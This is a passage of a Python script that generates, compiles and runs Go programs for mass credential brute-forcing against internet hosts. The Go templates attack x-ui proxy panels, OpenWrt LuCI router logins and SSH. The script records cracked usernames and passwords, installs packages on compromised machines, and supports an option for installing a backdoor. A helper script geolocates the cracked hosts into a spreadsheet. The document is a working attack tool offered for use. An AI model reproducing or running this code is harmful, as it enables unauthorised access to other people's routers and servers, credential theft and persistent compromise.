func checkCurl(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v curl >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func installPackage(client *ssh.Client, name string) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	installCmd := fmt.Sprintf(`
		if command -v apt >/dev/null 2>&1; then
			apt update -y && apt install -y %[1]s
		elif command -v yum >/dev/null 2>&1; then
			yum install -y %[1]s
		elif command -v opkg >/dev/null 2>&1; then
			opkg update && opkg install %[1]s
		else
			echo "NO_PACKAGE_MANAGER"
		fi
	`, name)

	err = session.Run(installCmd)
	return err == nil
}

func recordSuccess(ip, port, username, password string) {
	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
		f.Sync()
	}
}

func recordFailure(ip, port, username, password, reason string) {
	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\n", ip, port, username, password, reason))
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"

RETRY:
    batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	completedCount = 0
	
	// go updateProgress()

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	
	if retryFlag {
		fmt.Println("⚠️ 重新爆破启动...")
		goto RETRY
	}

	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板7内容 (注释掉进度打印) ===========================
XUI_GO_TEMPLATE_7 = '''package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

const (
	timeoutSeconds = 10
	successFlag    = `{"status":"success","data"`
)

var headers = map[string]string{
	"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Encoding": "gzip, deflate, br",
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text + "\\n")
}

func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil {
		return false, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(bodyBytes), successFlag) {
			return true, nil
		}
	}
	return false, nil
}

func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
	cleanPath := strings.Trim(path, "/")
	fullPath := cleanPath + "/api/utils/env"
	httpProbeURL := fmt.Sprintf("http://%s/%s", ipPort, fullPath)
	httpsProbeURL := fmt.Sprintf("https://%s/%s", ipPort, fullPath)

	ctx1, cancel1 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel1()
	success, err := sendRequest(ctx1, client, httpProbeURL)
	if err != nil {
		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
	}
	if success {
		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	ctx2, cancel2 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
	defer cancel2()
	success, err = sendRequest(ctx2, client, httpsProbeURL)
	if err != nil {
		// fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
	}
	if success {
		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
		writeResultToFile(file, output)
		return true
	}

	return false
}


func processIP(line string, file *os.File, paths []string, client *http.Client) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	for _, path := range paths {
		if tryBothProtocols(ipPort, path, client, file) {
			break
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	outputFile := "xui.txt"
	passwords := {pass_list}
	paths := passwords

	lines, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

    if len(paths) == 0 {
        fmt.Println("错误：路径/密码列表为空。")
        return
    }

	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(lines))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 100,
		},
		Timeout: timeoutSeconds * time.Second,
	}

	for _, line := range lines {
		wg.Add(1)
		go processIP(line, file, paths, client)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板8内容 (注释掉进度打印) ===========================
XUI_GO_TEMPLATE_8 = '''package main

import (
	"bufio"
	"context"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var client = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
    Timeout: 10 * time.Second,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        return http.ErrUseLastResponse
    },
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, urlStr string, username string, password string, origin string, referer string) (*http.Response, error) {
	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", urlStr, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Referer", referer)
	req.Header.Set("Origin", origin)
	req = req.WithContext(ctx)
	return client.Do(req)
}


func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
	file.Sync()
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	targets := []string{}

	trimmed := strings.TrimSpace(line)
	if trimmed == "" {
		return
	}

	if strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://") {
		targets = append(targets, trimmed)
	} else {
		parts := strings.Split(trimmed, ":")
		ip := parts[0]
		var ports []string
		if len(parts) == 1 {
			ports = []string{"80", "443"}
		} else if len(parts) == 2 {
			ports = []string{parts[1]}
		} else {
			return
		}
		for _, port := range ports {
			targets = append(targets,
				fmt.Sprintf("http://%s:%s/cgi-bin/luci/", ip, port),
				fmt.Sprintf("https://%s:%s/cgi-bin/luci/", ip, port),
			)
		}
	}

	for _, target := range targets {
		finalURL := target
		if !(strings.Contains(target, "/cgi-bin/luci")) {
			if strings.HasSuffix(target, "/") {
				finalURL = target + "cgi-bin/luci/"
			} else {
				finalURL = target + "/cgi-bin/luci/"
			}
		}
		u, _ := url.Parse(finalURL)
		origin := u.Scheme + "://" + u.Host
		referer := origin + "/"

		for _, username := range usernames {
			for _, password := range passwords {
				ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
				cancel()
				if err != nil {
					continue
				}

				defer resp.Body.Close()
				
				cookies := resp.Cookies()
				for _, c := range cookies {
					if c.Name == "sysauth_http" && c.Value != "" {
						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
						return
					}
				}
			}
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}
	
	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}
	
	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== ipcx.py 内容 (增加tqdm风格进度条) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter

def extract_host_port(line):
    match = re.search(r'https?://([^/\s]+)', line)
    if match:
        return match.group(1)
    else:
        return line.strip()

def get_ip_info(ip_port, retries=3):
    if ':' in ip_port:
        ip, port = ip_port.split(':', 1)
    else:
        ip = ip_port.strip()
        port = ''
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                ip_info = response.json()
                country = ip_info.get('country', 'N/A')
                region = ip_info.get('regionName', 'N/A')
                city = ip_info.get('city', 'N/A')
                isp = ip_info.get('isp', 'N/A')
                return [f"{ip}:{port}" if port else ip, country, region, city, isp]
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']
    return [f"{ip}:{port}" if port else ip, 'N/A', 'N/A', 'N/A', 'N/A']

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'https?://([^/\s]+)', url)
    if match:
        return match.group(1)
    
    if ':' in url:
        return url.split()[0]
   
    return url.split()[0]

def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
    elapsed_time = time.time() - start_time
    percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)

    if iteration > 0 and elapsed_time > 0:
        its_per_sec = iteration / elapsed_time
        remaining_time = (total - iteration) / its_per_sec
        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
    else:
        its_per_sec = 0
        eta_str = "??:??"

    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
    
    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
    
    sys.stdout.write(progress_str)
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    total_tasks = len(lines)
    start_time = time.time()

    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        os.remove(output_excel)

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    print_progress_bar(0, total_tasks, start_time, prefix='IP信息查询', suffix='开始...')
    for i, line in enumerate(lines):
        completed_tasks = i + 1
        parts = line.split()
        if len(parts) >= 3:
            addr, user, passwd = parts[:3]
        else:
            addr = parts[0]
            user = passwd = ''

        ip_port = extract_ip_port(addr)
        ip_info = get_ip_info(ip_port)
        row = [addr, ip_port, user, passwd] + ip_info[1:]

        wb = load_workbook(output_excel)
        ws = wb.active
        ws.append(row)
        adjust_column_width(ws)
        wb.save(output_excel)

        print_progress_bar(completed_tasks, total_tasks, start_time, prefix='IP信息查询', suffix=f'{ip_port}')
        time.sleep(1.5)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    process_ip_port_file('xui.txt', 'xui.xlsx')

"""
# =========================== 主脚本优化部分 ===========================
# 定义Go可执行文件的绝对路径
GO_EXEC = "/usr/local/go/bin/go"

def input_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_xui_go(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template2(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template3(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template4(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template5(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def to_go_bool(val: bool) -> str:
    return "true" if val else "false"

def to_go_string_array_one_line(lines: list) -> str:
    if not lines:
        return "[]string{}"
    return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"


def generate_xui_go_template6(semaphore_size, usernames, passwords, install_backdoor, custom_cmds):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    backdoor_flag = to_go_bool(install_backdoor)
    cmd_array = to_go_string_array_one_line(custom_cmds)
    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list) \
                            .replace("{enable_backdoor}", backdoor_flag) \
                            .replace("{custom_backdoor_cmds}", cmd_array)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template7(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_xui_go_template8(semaphore_size, usernames, passwords):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                            .replace("{user_list}", user_list) \
                            .replace("{pass_list}", pass_list)
    with open('xui.go', 'w', encoding='utf-8') as f:
        f.write(code)

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

def split_file(input_file, lines_per_file):
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    for idx, start in enumerate(range(0, len(lines), lines_per_file), 1):
        with open(os.path.join(TEMP_PART_DIR, f"part_{idx}.txt"), 'w', encoding='utf-8') as fout:
            fout.writelines(lines[start:start + lines_per_file])

def compile_go_program():
    executable_name = "xui_executable"
    if sys.platform == "win32":
        executable_name += ".exe"

    print("--- 正在编译Go程序... ---")
    
    # 为Go命令创建一个保证有HOME变量的环境
    go_env = os.environ.copy()
    if 'HOME' not in go_env:
        go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env:
        go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        result = subprocess.run(
            [GO_EXEC, 'build', '-o', executable_name, 'xui.go'],
            capture_output=True,
            text=True,
            check=True,
            encoding='utf-8',
            env=go_env
        )
        if result.stderr:
            print("--- Go编译器警告 ---")
            print(result.stderr)
        print(f"--- Go程序编译成功: {executable_name} ---")
        return executable_name
    except subprocess.CalledProcessError as e:
        print("--- Go 程序编译失败 ---")
        print(f"返回码: {e.returncode}")
        print("--- 标准输出 ---")
        print(e.stdout)
        print("--- 错误输出 ---")
        print(e.stderr)
        print("--------------------------")
        print("编译失败，请检查Go环境和代码。")
        sys.exit(1)

def adjust_oom_score():
    """
    尝试调整当前进程的oom_score_adj，使其更不容易被OOM Killer选中。
    需要root权限才能设置负值。
    """
    if sys.platform != "linux":
        return
    
    try:
        pid = os.getpid()
        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f:
                f.write("-500")
            print("✅ 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e:
        print(f"⚠️  调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    """检查并管理Swap交换文件"""
    if sys.platform != "linux":
        return

    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0:
            print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
            return

        print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
        choice = input("❓ 是否要创建一个2GB的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
            
            # 使用fallocate（如果可用）或dd创建文件
            if shutil.which("fallocate"):
                subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
            else:
                subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, capture_output=True)
            
            subprocess.run(["chmod", "600", swap_file], check=True)
            subprocess.run(["mkswap", swap_file], check=True)
            subprocess.run(["swapon", swap_file], check=True)
            
            # 注册一个退出时自动清理的函数
            atexit.register(cleanup_swap, swap_file)
            
            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
            print("   该文件将在脚本退出时自动被禁用和删除。")

    except Exception as e:
        print(f"❌ Swap文件管理失败: {e}")
        print("   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")

def cleanup_swap(swap_file):
    """在脚本退出时清理Swap文件"""
    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ 临时Swap文件已成功清理。")
    except Exception as e:
        print(f"⚠️ 清理Swap文件失败: {e}")

def print_progress_bar(iteration, total, start_time, prefix='', suffix='', length=50, fill='█'):
    """
    仿tqdm风格的进度条打印函数
    """
    elapsed_time = time.time() - start_time
    # 防止 total 为 0
    if total == 0:
        percent_str = "100.0"
        iteration = total
    else:
        percent_str = "{0:.1f}".format(100 * (iteration / float(total)))
    
    filled_length = int(length * iteration // total) if total > 0 else length
    bar = fill * filled_length + '-' * (length - filled_length)

    # 计算速率和剩余时间
    if iteration > 0 and elapsed_time > 0:
        its_per_sec = iteration / elapsed_time
        remaining_time = (total - iteration) / its_per_sec
        eta_str = time.strftime('%M:%S', time.gmtime(remaining_time))
    else:
        its_per_sec = 0
        eta_str = "??:??"

    elapsed_str = time.strftime('%M:%S', time.gmtime(elapsed_time))
    
    # 构建输出字符串, 增加空格以覆盖旧行
    progress_str = f'\r{prefix} |{bar}| {iteration}/{total} [{elapsed_str}<{eta_str}, {its_per_sec:.2f}it/s] {suffix}      '
    
    sys.stdout.write(progress_str)
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')

def run_xui_for_parts(sleep_seconds, executable_name):
    part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
    total_parts = len(part_files)
    start_time = time.time()

    total_memory = psutil.virtual_memory().total
    # --- 进一步降低内存限制到 70% ---
    mem_limit = int(total_memory * 0.70 / 1024 / 1024)
    print(f"检测到总内存: {total_memory / 1024 / 1024:.2f} MiB。将设置Go内存限制为: {mem_limit}MiB (总内存的70%)")
    
    run_env = os.environ.copy()
    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
    # --- 设置更积极的GC策略 ---
    run_env["GOGC"] = "50"
    print("--- 已设置Go垃圾回收器(GC)更积极地运行以控制内存。 ---")

    print_progress_bar(0, total_parts, start_time, prefix='爆破进度', suffix='开始...')
    for idx, part in enumerate(part_files, 1):
        # ================== 动态资源监控 ==================
        while True:
            mem_info = psutil.virtual_memory()
            available_percent = mem_info.available / mem_info.total * 100
            if available_percent < 15:
                print(f"\n⚠️ 系统可用内存低于15% (当前: {available_percent:.2f}%)，暂停60秒以待系统恢复...")
                time.sleep(60)
            else:
                break
        # ================================================

        shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')

        try:
            # print(f"--- 正在运行已编译的程序进行爆破: {part} ---")
            if sys.platform != "win32":
                os.chmod(executable_name, 0o755)
            
            cmd = []
            if sys.platform == "linux":
                cmd.extend(["nice", "-n", "10", "ionice", "-c", "2", "-n", "7"])
            cmd.append('./' + executable_name)

            # 使用 Popen 而不是 run 来实时读取输出
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding='utf-8',
                env=run_env
            )
            
            # 实时显示Go程序的输出
            for line in iter(process.stdout.readline, ''):
                if not line.strip().startswith('\r'):
                    sys.stdout.write(line)
                    sys.stdout.flush()

            process.wait()
            if process.returncode != 0:
                 raise subprocess.CalledProcessError(process.returncode, cmd)


        except subprocess.CalledProcessError as e:
            print(f"\n--- 程序执行失败: {part} ---")
            print(f"返回码: {e.returncode}")
            sys.exit(1)


        output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
        if os.path.exists('xui.txt'):
            shutil.move('xui.txt', output_file)
        
        if os.path.exists("hmsuccess.txt"):
            shutil.move("hmsuccess.txt", os.path.join(TEMP_HMSUCCESS_DIR, f"hmsuccess{idx}.txt"))
        if os.path.exists("hmfail.txt"):
            shutil.move("hmfail.txt", os.path.join(TEMP_HMFAIL_DIR, f"hmfail{idx}.txt"))

        print_progress_bar(idx, total_parts, start_time, prefix='爆破进度', suffix=f'已完成: {part}')
        time.sleep(sleep_seconds)



def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file):
        os.remove(merged_file)

    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("xui") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path):
        os.remove(output_path)
    
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge:
        return

    with open(output_path, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)


def run_ipcx():
    if os.path.exists('xui.txt') and os.path.getsize('xui.txt') > 0:
        subprocess.run([sys.executable, 'ipcx.py'])

def clean_temp_files():
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
